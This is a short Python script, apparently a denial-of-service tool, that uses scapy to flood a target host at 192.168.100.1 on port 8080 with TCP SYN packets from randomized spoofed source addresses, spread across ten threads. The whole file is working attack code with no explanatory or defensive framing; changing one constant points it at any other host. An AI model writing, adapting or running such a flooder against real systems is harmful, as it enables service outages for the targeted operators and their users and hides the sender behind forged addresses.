import random
import threading
import time

from scapy.layers.inet import IP, TCP
from scapy.sendrecv import send

TARGET = "192.168.100.1"
DST_PORT = 8080
THREAD_COUNT = 10
PACKETS_PER_THREAD = 100


def ran_ip():
    while True:
        ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
        if not ip.startswith("127.") and not ip.startswith("169.254."):
            return ip

def floor():
    print("[+] Executing the loop...")
    for i in range(PACKETS_PER_THREAD):
        src_ip = ran_ip()
        src_port = random.randint(80, 65000)
        seq = random.randint(999, 99999)

        ip = IP(src=src_ip, dst=TARGET)
        tcp = TCP(sport=src_port, dport=DST_PORT, flags='S', seq=seq)
        packet = ip / tcp

        send(packet, timeout=2, verbose=0)

        print(f"[+] Packet with number {i} send.")

def threaded_dos():
    threads = []
    for _ in range(THREAD_COUNT):
        t = threading.Thread(target=floor)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()


if __name__ == '__main__':
    start = time.time()
    threaded_dos()
    print(f"[*] Total time: {round(time.time() - start, 2)}s")
